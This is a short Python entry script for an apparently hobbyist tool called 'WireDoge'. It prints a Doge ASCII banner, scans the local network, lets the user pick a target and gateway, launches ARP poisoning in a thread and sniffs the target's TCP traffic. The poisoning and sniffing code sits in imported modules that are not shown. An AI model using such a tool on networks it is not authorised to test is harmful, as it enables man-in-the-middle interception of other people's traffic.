import os
import sys
from colorama import init, Fore, Back
import threading
from sniffer import sniff
from poisoner import *

init()

def print_title():
    os.system('clear')
    print(" _       ___           ____                 ")
    print("| |     / (_)_______  / __ \\____  ____ ____ ")
    print("| | /| / / / ___/ _ \/ / / / __ \\/ __ `/ _ \\")
    print("| |/ |/ / / /  /  __/ /_/ / /_/ / /_/ /  __/")
    print("|__/|__/_/_/   \___/_____/\____/\__, /\___/ ")
    print("                               /____/       ")
    print()
    print(Back.WHITE + Fore.BLACK, end="")
    print("          ▄              ▄      ")
    print("         ▌▒█           ▄▀▒▌     ")
    print("         ▌▒▒█        ▄▀▒▒▒▐     ")
    print("        ▐▄█▒▒▀▀▀▀▄▄▄▀▒▒▒▒▒▐     ")
    print("      ▄▄▀▒▒▒▒▒▒▒▒▒▒▒█▒▒▄█▒▐     ")
    print("    ▄▀▒▒▒░░░▒▒▒░░░▒▒▒▀██▀▒▌     ")
    print("   ▐▒▒▒▄▄▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▀▄▒▌    ")
    print("   ▌░░▌█▀▒▒▒▒▒▄▀█▄▒▒▒▒▒▒▒█▒▐    ")
    print("  ▐░░░▒▒▒▒▒▒▒▒▌██▀▒▒░░░▒▒▒▀▄▌   ")
    print("  ▌░▒▒▒▒▒▒▒▒▒▒▒▒▒▒░░░░░░▒▒▒▒▌   ")
    print(" ▌▒▒▒▄██▄▒▒▒▒▒▒▒▒░░░░░░░░▒▒▒▐   ")
    print(" ▐▒▒▐▄█▄█▌▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▒▒▌  ")
    print(" ▐▒▒▐▀▐▀▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒░▒▒▐   ")
    print("  ▌▒▒▀▄▄▄▄▄▄▒▒▒▒▒▒▒▒░▒░▒░▒▒▒▌   ")
    print("  ▐▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒▒▄▒▒▐    ")
    print("   ▀▄▒▒▒▒▒▒▒▒▒▒▒▒▒░▒░▒▄▒▒▒▒▌    ")
    print("     ▀▄▒▒▒▒▒▒▒▒▒▒▄▄▄▀▒▒▒▒▄▀     ")
    print("       ▀▄▄▄▄▄▄▀▀▀▒▒▒▒▒▄▄▀       ")
    print("          ▀▀▀▀▀▀▀▀▀▀▀▀          ")
    print(" WoW Much Packets, Very Network ")
    print(Fore.RESET + Back.RESET, end="")
    print()


def main():
    
    print_title()
    adapter = adapter_selection()
    ip, mac, netmask, scan_range = get_adapter_info(adapter)
    ip_list = get_devices(scan_range)
    target, gateway = get_targets(ip_list)

    input("Hit Enter to Get Started...")
    os.system("clear")
    # Big booty multi-threading
    arp_thread = threading.Thread(target=arp_poison, args=(target, gateway,))
    arp_thread.start()

    packets = sniff(target['IP'], [6])
    print("Stopping Main Thread")
    arp_thread.stop = True
    arp_thread.join()

    
if __name__=="__main__":
    if not os.geteuid() == 0:
        sys.exit("Only root can run this script")
    main()